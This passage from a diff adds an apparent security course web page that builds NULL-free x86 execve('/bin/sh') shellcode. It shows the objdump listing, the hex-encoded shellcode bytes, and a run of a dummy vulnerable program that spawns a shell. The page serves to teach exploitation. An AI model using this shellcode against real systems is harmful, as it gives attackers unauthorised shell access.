+        <span style="color: #00ffff;">db</span> <span style="color: #ffa07a;">"/bin/sh"</span>,0 <span style="color: #ff7f24;">;</span>
+</pre>
+</div>
+
+<p>
+And if we now look at the objdump, there is not a NULL to be found:
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel execve_nonull
+
+execve_nonull:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060:	eb 17                	jmp    8048079 &lt;callback&gt;
+
+08048062 &lt;dowork&gt;:
+ 8048062:	5e                   	pop    esi
+ 8048063:	31 c0                	xor    eax,eax
+ 8048065:	50                   	push   eax
+ 8048066:	56                   	push   esi
+ 8048067:	31 d2                	xor    edx,edx
+ 8048069:	89 e1                	mov    ecx,esp
+ 804806b:	89 f3                	mov    ebx,esi
+ 804806d:	b0 0b                	mov    al,0xb
+ 804806f:	cd 80                	int    0x80
+ 8048071:	31 db                	xor    ebx,ebx
+ 8048073:	31 c0                	xor    eax,eax
+ 8048075:	b0 01                	mov    al,0x1
+ 8048077:	cd 80                	int    0x80
+
+08048079 &lt;callback&gt;:
+ 8048079:	e8 e4 ff ff ff       	call   8048062 &lt;dowork&gt;
+ 804807e:	2f                   	das    
+ 804807f:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
+ 8048082:	2f                   	das    
+ 8048083:	73 68                	jae    80480ed &lt;callback+0x74&gt;
+	...
+</pre>
+
+<p>
+Finally, we can use our shell code in the dummy exploit with success:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./hexify.sh execve_nonull
+\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\x89\xe1\x89\xf3\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
+user@si485H-base:demo$ ./dummy_exploit $(printf "\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\x89\xe1\x89\xf3\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")
+$
+</pre>
+</div>
+</div>
+</div>
+</body>
+</html>
